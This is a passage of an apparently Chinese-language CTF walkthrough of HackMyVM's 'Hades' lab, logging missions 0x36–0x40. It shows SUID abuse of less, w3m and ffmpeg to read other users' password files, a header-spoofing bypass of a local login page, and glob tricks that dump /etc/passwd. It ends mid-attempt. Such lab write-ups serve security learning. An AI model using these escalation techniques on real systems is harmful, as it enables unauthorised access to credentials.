uid=2027(hestia) gid=2027(hestia) groups=2027(hestia)
hestia@hades:~$ ls -la
total 228
drwxr-x--- 2 root   hestia   4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 hestia hestia    220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hestia hestia   3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hestia hestia    807 Apr 23  2023 .profile
-rw-r----- 1 root   hestia     22 Apr  5 06:36 flagz.txt
-r-s--s--- 1 ianthe hestia 198960 Apr  5 06:36 less
-rw-r----- 1 root   hestia    157 Apr  5 06:36 mission.txt
hestia@hades:~$ grep -ra '\^*\^' .
grep: ./less: Permission denied
./flagz.txt:^mIZKIDJYZQDogbkwRGy^
hestia@hades:~$ cat mission.txt 
################
# MISSION 0x36 #
################

## EN ##
User ianthe has left us her own less.

## ES ##
La usuaria ianthe nos ha dejado su propio less.
hestia@hades:~$ sudo -l
[sudo] password for hestia: 
Sorry, user hestia may not run sudo on hades.
hestia@hades:~$ ./less 
Missing filename ("less --help" for help)
hestia@hades:~$ ./less /pwned/ianthe/flagz.txt
/pwned/ianthe/flagz.txt: Permission denied
```
注意到是suid权限的，尝试进行利用： https://gtfobins.github.io/gtfobins/less/#suid

> If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
> This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
> sudo install -m =xs $(which less) .
> ./less file_to_read

```bash
hestia@hades:~$ ls -la
total 228
drwxr-x--- 2 root   hestia   4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 hestia hestia    220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hestia hestia   3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hestia hestia    807 Apr 23  2023 .profile
-rw-r----- 1 root   hestia     22 Apr  5 06:36 flagz.txt
-r-s--s--- 1 ianthe hestia 198960 Apr  5 06:36 less
-rw-r----- 1 root   hestia    157 Apr  5 06:36 mission.txt
hestia@hades:~$ find / -user ianthe -type f 2>/dev/null
/opt/ianthe_pass.txt
/var/tmp/ab.txt
/pwned/hestia/less
hestia@hades:~$ find / -group ianthe -type f 2>/dev/null
/opt/ianthe_pass.txt
/var/tmp/ab.txt
hestia@hades:~$ ./less /opt/ianthe_pass.txt
```
得到 DphioLqgVIIFclTwBsMP

## 37 ianthe
```bash
ianthe@hades:~$ ls -la
total 36
drwxr-x--- 1 root   ianthe 4096 Jun 14 08:08 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 ianthe ianthe  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 ianthe ianthe 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 ianthe ianthe  807 Apr 23  2023 .profile
-rw-r----- 1 root   ianthe   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   ianthe  448 Jun 14 08:08 mission.txt
ianthe@hades:~$ grep -ra '\^*\^' . 
./flagz.txt:^SdoibXIPAdqIdzDrYId^
ianthe@hades:~$ sudo -l
[sudo] password for ianthe: 
Sorry, user ianthe may not run sudo on hades.
ianthe@hades:~$ cat mission.txt 
################
# MISSION 0x37 #
################

## EN ##
Seems that irene is developing an auth system http://localhost/irene_auth.php only accessible by hackmyvm.hmv.
(No bruteforce required, just some "admin" default pass :) )
## ES ##
Parece que irene esta desarrollando algun sistema de autenticacion http://localhost/irene_auth.php solo accesible por hackmyvm.hmv.
(No se requiere bruteforce, solo algunas pass por defecto de "admin" :) )
ianthe@hades:~$ curl -si http://localhost/irene_auth.php 
HTTP/1.1 403 Forbidden
Server: nginx/1.22.1
Date: Wed, 03 Jul 2024 15:53:13 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=7ve2pf2i59dh4t4vkk305g6qb6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
ianthe@hades:~$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.66.0.66     hades
127.0.0.1       hades.hmv
127.0.0.1       whatsmypass.hmv
ianthe@hades:~$ curl whatsmypass.hmv
HXisrOPSdTcSSTEyyaLn

ianthe@hades:~$ curl -si -H "Referer: http://hackmyvm.hmv/" -H "X-Forwarded-For: hackmyvm.hmv" http://localhost/irene_auth.php?admin
HTTP/1.1 403 Forbidden
Server: nginx/1.22.1
Date: Wed, 03 Jul 2024 16:00:51 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=ep12lrp0qpv31p26mb5690d1nr; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
ianthe@hades:~$ curl -si -H "Referer: hackmyvm.hmv" -H "X-Forwarded-For: hackmyvm.hmv" -H "Origin: hackmyvm.hmv"  http://localhost/irene_auth.php?auth=admin -X POST -d "username=admin&password=admin"
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Thu, 04 Jul 2024 01:50:40 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=sq767lngu1m0t17fk22uhaoqpe; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: hackmyvm.hmv
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization


            <form method="post" action="">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
                <br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
                <br>
                <input type="submit" value="Login">
            </form>
ianthe@hades:~$ curl -si -H "Referer: hackmyvm.hmv" -H "X-Forwarded-For: hackmyvm.hmv" -H "Origin: hackmyvm.hmv"  http://localhost/irene_auth.php?auth=admin -X POST -d "username=admin&password=admin"
HTTP/1.1 302 Found
Server: nginx/1.22.1
Date: Thu, 04 Jul 2024 01:51:18 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=udpclfue0nanu2dsalf3mmoa6d; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: hackmyvm.hmv
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization
Location: index.php

TDyuLyWLDksEhgmAYDJC
```
实际上只有最后一个有效：
```bash
ianthe@hades:~$ curl -si -H "Origin: hackmyvm.hmv"  http://localhost/irene_auth.php?auth=admin
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Thu, 04 Jul 2024 01:56:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=tsgevgkt5d9pg7ftdjc6qskc7t; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: hackmyvm.hmv
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization


            <form method="post" action="">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
                <br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
                <br>
                <input type="submit" value="Login">
            </form>
            ianthe@hades:~$
ianthe@hades:~$ curl -si -H "Origin: hackmyvm.hmv"  http://localhost/irene_auth.php?auth=admin -X POST -d "username=admin&password=admin"
HTTP/1.1 302 Found
Server: nginx/1.22.1
Date: Thu, 04 Jul 2024 01:57:30 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=6qugl5ch197pqvpnelnvd8gq3o; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: hackmyvm.hmv
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization
Location: index.php

TDyuLyWLDksEhgmAYDJC
```

## 38 irene

```bash
~$ whoami;id
irene
uid=2029(irene) gid=2029(irene) groups=2029(irene)
irene@hades:~$ ls -la
total 48
drwxr-x--- 2 root  irene  4096 Apr  5 06:36 .
drwxr-xr-x 1 root  root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 irene irene   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 irene irene  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 irene irene   807 Apr 23  2023 .profile
-rw-r----- 1 root  irene    22 Apr  5 06:36 flagz.txt
---s--s--- 1 root  irene 16216 Apr  5 06:36 hatechars
-rw-r----- 1 root  irene   145 Apr  5 06:36 mission.txt
irene@hades:~$ cat flagz.txt
^ZACnrFArVosWGJNfPkN^
irene@hades:~$ cat mission.txt 
################
# MISSION 0x38 #
################

## EN ##
User iris hates some characters.

## ES ##
La usuaria iris odia algunos caracteres.
irene@hades:~$ echo '' > /tmp/temp_char
irene@hades:~$ ls -la /tmp/temp_char
-rw-r--r-- 1 irene irene 1 Jul  4 02:12 /tmp/temp_char
irene@hades:~$ cat /tmp/temp_char

irene@hades:~$ ./hatechars 
Enter file to show:
/tmp/temp_char
Invalid character!!
irene@hades:~$ rm /tmp/temp_char
irene@hades:~$ touch /tmp/temp_char
irene@hades:~$ ls -la /tmp/temp_char
-rw-r--r-- 1 irene irene 0 Jul  4 02:15 /tmp/temp_char
irene@hades:~$ ./hatechars 
Enter file to show:
/tmp/temp_char
Invalid character!!
irene@hades:~$ ./hatechars -h
Enter file to show:
/dev/null
Invalid character!!
irene@hades:~$ ./hatechars   
Enter file to show:
!
/bin/cat: '!': No such file or directory
irene@hades:~$ ls -l /bin/cat:
ls: cannot access '/bin/cat:': No such file or directory
irene@hades:~$ ls -l /bin/cat 
-rwxr-xr-x 1 root root 44016 Sep 20  2022 /bin/cat
irene@hades:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
irene@hades:~$ ls -l /usr/bin/cat
-rwxr-xr-x 1 root root 44016 Sep 20  2022 /usr/bin/cat
irene@hades:~$ diff /bin/cat /usr/bin/cat
irene@hades:~$ find / -user irene 2>/dev/null | grep -v proc
/dev/pts/2
/dev/pts/1
/dev/pts/8
/var/tmp/xx
/var/tmp/cat
/var/tmp/hatechars
/var/tmp/gg
/pwned/irene/.bash_logout
/pwned/irene/.bashrc
/pwned/irene/.profile
irene@hades:~$ find / -group irene 2>/dev/null | grep -v proc
/var/tmp/xx
/var/tmp/cat
/var/tmp/hatechars
/var/tmp/gg
/pwned/irene
/pwned/irene/.bash_logout
/pwned/irene/.bashrc
/pwned/irene/hatechars
/pwned/irene/flagz.txt
/pwned/irene/mission.txt
/pwned/irene/.profile
```
```text
Dec Hex    Dec Hex    Dec Hex  Dec Hex  Dec Hex  Dec Hex   Dec Hex   Dec Hex
0 00 NUL  16 10 DLE  32 20    48 30 0  64 40 @  80 50 P   96 60 `  112 70 p
1 01 SOH  17 11 DC1  33 21 !  49 31 1  65 41 A  81 51 Q   97 61 a  113 71 q
2 02 STX  18 12 DC2  34 22 "  50 32 2  66 42 B  82 52 R   98 62 b  114 72 r
3 03 ETX  19 13 DC3  35 23 #  51 33 3  67 43 C  83 53 S   99 63 c  115 73 s
4 04 EOT  20 14 DC4  36 24 $  52 34 4  68 44 D  84 54 T  100 64 d  116 74 t
5 05 ENQ  21 15 NAK  37 25 %  53 35 5  69 45 E  85 55 U  101 65 e  117 75 u
6 06 ACK  22 16 SYN  38 26 &  54 36 6  70 46 F  86 56 V  102 66 f  118 76 v
7 07 BEL  23 17 ETB  39 27 '  55 37 7  71 47 G  87 57 W  103 67 g  119 77 w
8 08 BS   24 18 CAN  40 28 (  56 38 8  72 48 H  88 58 X  104 68 h  120 78 x
9 09 HT   25 19 EM   41 29 )  57 39 9  73 49 I  89 59 Y  105 69 i  121 79 y
10 0A LF   26 1A SUB  42 2A *  58 3A :  74 4A J  90 5A Z  106 6A j  122 7A z
11 0B VT   27 1B ESC  43 2B +  59 3B ;  75 4B K  91 5B [  107 6B k  123 7B {
12 0C FF   28 1C FS   44 2C ,  60 3C <  76 4C L  92 5C \  108 6C l  124 7C |
13 0D CR   29 1D GS   45 2D -  61 3D =  77 4D M  93 5D ]  109 6D m  125 7D }
14 0E SO   30 1E RS   46 2E .  62 3E >  78 4E N  94 5E ^  110 6E n  126 7E ~
15 0F SI   31 1F US   47 2F /  63 3F ?  79 4F O  95 5F _  111 6F o  127 7F DEL
```

尝试写一个脚本，将所有字符写到一个文件夹中，然后进行尝试:
```bash
import os

output_folder = 'ascii_chars'
os.makedirs(output_folder, exist_ok=True)

for i in range(128):
    char = chr(i)
    filename = os.path.join(output_folder, f'char_{i}.txt')
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(char)

print("All ASCII characters have been written to files.")
```
尝试进行利用:
```bash
hgbe02@pwn:~/temp/temp_txt/ascii_chars$ for i in {0..127}; do printf /var/tmp/ascii_chars/char_$i.txt;printf '\n'; done       
/var/tmp/ascii_chars/char_0.txt
/var/tmp/ascii_chars/char_1.txt
/var/tmp/ascii_chars/char_2.txt
/var/tmp/ascii_chars/char_3.txt
/var/tmp/ascii_chars/char_4.txt
/var/tmp/ascii_chars/char_5.txt
.......
hgbe02@pwn:~/temp/temp_txt/ascii_chars$ cat *.txt !"#$%&'()*+,-./0

defghijklm
          nopqrstuvw
⸮123456789:;<=>?@ABCDEFGHIJKLMNPQRSTUVWXY       Z[\]^_`abc

irene@hades:~$ for i in {0..127}; do printf /var/tmp/ascii_chars/char_$i.txt | ./hatechars; done | grep -v Invalid | uniq
Enter file to show:
```
都未能成功,在`/var/tmp`看到了一个像提示的东西：
```bash
irene@hades:/var/tmp$ cat cat
#!/bin/bash
 /bin/cat  "$@"
 irene@hades:/var/tmp$ ./cat
whoami
whoami
id
id
^C
```
"$@" 是一个特殊的 shell 变量，用来引用传递给脚本或函数的所有参数，每个参数都作为一个独立的字符串，但是不知道咋利用，看到了这篇文章：https://blog.csdn.net/l_liangkk/article/details/105649018
```bash
irene@hades:~$ ./hatechars 
Enter file to show:
$#
/bin/cat: 0: No such file or directory
irene@hades:~$ ./hatechars 
Enter file to show:
$$
/bin/cat: 19057: No such file or directory
```
这里思路就断掉了，后面请教群里的Frank师傅，他指点了以下做法，和上面关系不大；
```bash
irene@hades:~$ find / -user iris 2>/dev/null | grep -v proc
/dev/pts/5
/etc/met.txt
irene@hades:/etc$ /pwned/irene/hatechars
Enter file to show:
???????
# /etc/aliases
mailer-daemon: postmaster
postmaster: root
nobody: root
......
$endif
set ask askcc append dot save crt
ignore Received Message-Id Resent-Message-Id Status Mail-From Return-Path Via Delivered-To
FiqGNcXumTKwLTPRqXMh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
......

irene@hades:/etc$ /pwned/irene/hatechars 
Enter file to show:
?????????
multi on
Debian GNU/Linux 12
TZif2UTCTZif2UTC
UTC0
#
.......
```

## 39 iris
```bash
iris@hades:~$ ls -la
total 32
drwxr-x--- 2 root iris 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 iris iris  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 iris iris 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 iris iris  807 Apr 23  2023 .profile
-rw-r----- 1 root iris   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root iris  137 Apr  5 06:36 mission.txt
iris@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^xXcULtRBXxcHIUVxtXT^
iris@hades:~$ cat mission.txt 
################
# MISSION 0x39 #
################

## EN ##
User kore likes to navigate! 

## ES ##
A la usuaria kore le gusta navegar!
iris@hades:~$ find / -user iris 2>/dev/null | grep -v proc 
/dev/pts/4
/dev/pts/5
/etc/met.txt
/pwned/iris/.bash_logout
/pwned/iris/.bashrc
/pwned/iris/.profile
iris@hades:~$ find / -name navig 2>/dev/null
iris@hades:~$ find / -name *navig* 2>/dev/null
/usr/share/icons/hicolor/scalable/stock/navigation
/usr/share/icons/hicolor/48x48/stock/navigation
/usr/share/icons/hicolor/96x96/stock/navigation
/usr/share/icons/hicolor/256x256/stock/navigation
/usr/share/icons/hicolor/32x32/stock/navigation
/usr/share/icons/hicolor/128x128/stock/navigation
/usr/share/icons/hicolor/72x72/stock/navigation
/usr/share/icons/hicolor/192x192/stock/navigation
/usr/share/icons/hicolor/64x64/stock/navigation
/usr/share/icons/hicolor/22x22/stock/navigation
/usr/share/icons/hicolor/24x24/stock/navigation
/usr/share/icons/hicolor/16x16/stock/navigation
/usr/share/icons/hicolor/36x36/stock/navigation
/usr/share/icons/hicolor/512x512/stock/navigation
iris@hades:~$ find / -user kore 2>/dev/null | grep -v proc
/srv/kore_pass.txt
/dev/pts/3
/usr/bin/w3m
iris@hades:~$ ls -la /usr/bin/w3m
-rwS--s--- 1 kore iris 1630888 Jan 29  2023 /usr/bin/w3m
iris@hades:~$ whoami;id
iris
uid=2030(iris) gid=2030(iris) groups=2030(iris)
iris@hades:~$ /usr/bin/w3m
w3m version w3m/0.5.3+git20230121, options lang=en,m17n,image,color,ansi-color,mouse,gpm,menu,cookie,ssl,ssl-verify,external-uri-loader,w3mmailer,nntp,gopher,ipv6,alarm,mark,migemo  
usage: w3m [options] [URL or filename]
options:
    -t tab           set tab width
    -r               ignore backspace effect
    -l line          # of preserved line (default 10000)
    -I charset       document charset
    -O charset       display/output charset
    -B               load bookmark
    -bookmark file   specify bookmark file
    -T type          specify content-type
    -m               internet message mode
    -v               visual startup mode
    -M               monochrome display
    -H               use high-intensity colors
    -N               open URL of command line on each new tab
    -F               automatically render frames
    -cols width      specify column width (used with -dump)
    -ppc count       specify the number of pixels per character (4.0...32.0)
    -ppl count       specify the number of pixels per line (4.0...64.0)
    -dump            dump formatted page into stdout
    -dump_head       dump response of HEAD request into stdout
    -dump_source     dump page source into stdout
    -dump_both       dump HEAD and source into stdout
    -dump_extra      dump HEAD, source, and extra information into stdout
    -post file       use POST method with file content
    -header string   insert string as a header
    +<num>           goto <num> line
    -num             show line number
    -no-proxy        don't use proxy
    -4               IPv4 only (-o dns_order=4)
    -6               IPv6 only (-o dns_order=6)
    -insecure        use insecure SSL config options
    -no-mouse        don't use mouse
    -cookie          use cookie (-no-cookie: don't use cookie)
    -graph           use DEC special graphics for border of table and menu
    -no-graph        use ASCII character for border of table and menu
    -s               squeeze multiple blank lines
    -W               toggle search wrap mode
    -X               don't use termcap init/deinit
    -title[=TERM]    set buffer name to terminal title string
    -o opt=value     assign value to config option
    -show-option     print all config options
    -config file     specify config file
    -debug           use debug mode (only for debugging)
    -reqlog          write request logfile
    -help            print this usage message
    -version         print w3m version
```
可以参考： https://gtfobins.github.io/gtfobins/w3m/

```bash
iris@hades:~$ /usr/bin/w3m /pwned/kore/flagz.txt -dump
w3m: Can't load /pwned/kore/flagz.txt.
iris@hades:~$ /usr/bin/w3m /srv/kore_pass.txt -dump
mdAXiSXteTPiGGTpmajP
```


## 40 kore
```bash
kore@hades:~$ ls -la
total 32
drwxr-x--- 2 root kore 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 kore kore  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 kore kore 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 kore kore  807 Apr 23  2023 .profile
-rw-r----- 1 root kore   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root kore  156 Apr  5 06:36 mission.txt
kore@hades:~$ cat flagz.txt 
^FEYohPSMjrxKzdLNxkQ^
kore@hades:~$ cat mission.txt 
################
# MISSION 0x40 #
################

## EN ##
User leda always wanted to edit videos.

## ES ##
La usuaria leda siempre quiso editar videos.
kore@hades:~$ sudo -l
[sudo] password for kore: 
Sorry, user kore may not run sudo on hades.
kore@hades:~$ find / -user leda 2>/dev/null
/usr/bin/ffmpeg
/etc/led
kore@hades:~$ ls -la /usr/bin/ffmpeg
-rwS--s--- 1 leda kore 293288 Nov 11  2023 /usr/bin/ffmpeg
kore@hades:~$ ls -la /etc/led
-r--r----- 1 leda leda 14 Sep 21  2005 /etc/led
kore@hades:~$ /usr/bin/ffmpeg
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 12 (Debian 12.2.0-14)
  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --di
sable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libd
av1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enab
le-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsn
appy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libv
px --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --e
nable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      57. 28.100 / 57. 28.100
  libavcodec     59. 37.100 / 59. 37.100
  libavformat    59. 27.100 / 59. 27.100
  libavdevice    59.  7.100 / 59.  7.100
  libavfilter     8. 44.100 /  8. 44.100
  libswscale      6.  7.100 /  6.  7.100
  libswresample   4.  7.100 /  4.  7.100
  libpostproc    56.  6.100 / 56.  6.100
Hyper fast Audio and Video encoder
usage: ffmpeg [options] [[infile options] -i infile]... {[outfile options] outfile}...

Use -h to get full help or, even better, run 'man ffmpeg'
kore@hades:~$ ffmpeg -h
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 12 (Debian 12.2.0-14)
  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      57. 28.100 / 57. 28.100
  libavcodec     59. 37.100 / 59. 37.100
  libavformat    59. 27.100 / 59. 27.100
  libavdevice    59.  7.100 / 59.  7.100
  libavfilter     8. 44.100 /  8. 44.100
  libswscale      6.  7.100 /  6.  7.100
  libswresample   4.  7.100 /  4.  7.100
  libpostproc    56.  6.100 / 56.  6.100
Hyper fast Audio and Video encoder
usage: ffmpeg [options] [[infile options] -i infile]... {[outfile options] outfile}...

Getting help:
    -h      -- print basic options
    -h long -- print more options
    -h full -- print all options (including all format and codec specific options, very long)
    -h type=name -- print all options for the named decoder/encoder/demuxer/muxer/filter/bsf/protocol
    See man ffmpeg for detailed description of the options.

Print help / information / capabilities:
-L                  show license
-h topic            show help
-? topic            show help
-help topic         show help
--help topic        show help
-version            show version
-buildconf          show build configuration
-formats            show available formats
-muxers             show available muxers
-demuxers           show available demuxers
-devices            show available devices
-codecs             show available codecs
-decoders           show available decoders
-encoders           show available encoders
-bsfs               show available bit stream filters
-protocols          show available protocols
-filters            show available filters
-pix_fmts           show available pixel formats
-layouts            show standard channel layouts
-sample_fmts        show available audio sample formats
-dispositions       show available stream dispositions
-colors             show available color names
-sources device     list sources of the input device
-sinks device       list sinks of the output device
-hwaccels           show available HW acceleration methods

Global options (affect whole program instead of just one file):
-loglevel loglevel  set logging level
-v loglevel         set logging level
-report             generate a report
-max_alloc bytes    set maximum size of a single allocated block
-y                  overwrite output files
-n                  never overwrite output files
-ignore_unknown     Ignore unknown stream types
-filter_threads     number of non-complex filter threads
-filter_complex_threads  number of threads for -filter_complex
-stats              print progress report during encoding
-max_error_rate maximum error rate  ratio of decoding errors (0.0: no errors, 1.0: 100% errors) above which ffmpeg returns an error instead of success.
-vol volume         change audio volume (256=normal)

Per-file main options:
-f fmt              force format
-c codec            codec name
-codec codec        codec name
-pre preset         preset name
-map_metadata outfile[,metadata]:infile[,metadata]  set metadata information of outfile from infile
-t duration         record or transcode "duration" seconds of audio/video
-to time_stop       record or transcode stop time
-fs limit_size      set the limit file size in bytes
-ss time_off        set the start time offset
-sseof time_off     set the start time offset relative to EOF
-seek_timestamp     enable/disable seeking by timestamp with -ss
-timestamp time     set the recording timestamp ('now' to set the current time)
-metadata string=string  add metadata
-program title=string:st=number...  add program with specified streams
-target type        specify target file type ("vcd", "svcd", "dvd", "dv" or "dv50" with optional prefixes "pal-", "ntsc-" or "film-")
-apad               audio pad
-frames number      set the number of frames to output
-filter filter_graph  set stream filtergraph
-filter_script filename  read stream filtergraph description from a file
-reinit_filter      reinit filtergraph on input parameter changes
-discard            discard
-disposition        disposition

Video options:
-vframes number     set the number of video frames to output
-r rate             set frame rate (Hz value, fraction or abbreviation)
-fpsmax rate        set max frame rate (Hz value, fraction or abbreviation)
-s size             set frame size (WxH or abbreviation)
-aspect aspect      set aspect ratio (4:3, 16:9 or 1.3333, 1.7777)
-vn                 disable video
-vcodec codec       force video codec ('copy' to copy stream)
-timecode hh:mm:ss[:;.]ff  set initial TimeCode value.
-pass n             select the pass number (1 to 3)
-vf filter_graph    set video filters
-ab bitrate         audio bitrate (please use -b:a)
-b bitrate          video bitrate (please use -b:v)
-dn                 disable data

Audio options:
-aframes number     set the number of audio frames to output
-aq quality         set audio quality (codec-specific)
-ar rate            set audio sampling rate (in Hz)
-ac channels        set number of audio channels
-an                 disable audio
-acodec codec       force audio codec ('copy' to copy stream)
-vol volume         change audio volume (256=normal)
-af filter_graph    set audio filters

Subtitle options:
-s size             set frame size (WxH or abbreviation)
-sn                 disable subtitle
-scodec codec       force subtitle codec ('copy' to copy stream)
-stag fourcc/tag    force subtitle tag/fourcc
-fix_sub_duration   fix subtitles duration
-canvas_size size   set canvas size (WxH or abbreviation)
-spre preset        set the subtitle options to the indicated preset
```

在 hacktrick 找到这个 payload：
> ffmpeg is crucial for assessing the integrity of audio files, highlighting detailed information and pinpointing any discrepancies.
> ffmpeg -v info -i stego.mp3 -f null -

然后问了一下rpj7，他告诉我是由 concat 以及 -i 实现的，我看了一些文章进行了部分修改（以及部分discord剧透的细节）
- https://stackoverflow.com/questions/38996925/ffmpeg-concat-unsafe-file-name
- https://community.unix.com/t/ffmpeg-invalid-data-found-when-processing-input/381336/15
- https://stackoverflow.com/questions/50455695/why-does-ffmpeg-ignore-protocol-whitelist-flag-when-converting-https-m3u8-stream

好吧想不出来了，尝试按照 `rpj7`师傅的方法进行尝试吧：
- 首先要设置 safe 等级为 0
- 然后设置白名单

```bash
kore@hades:~$ /usr/bin/ffmpeg -f concat -safe 0 -protocol_whitelist file,https,tcp,tls,crypto -i /etc/led
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 12 (Debian 12.2.0-14)
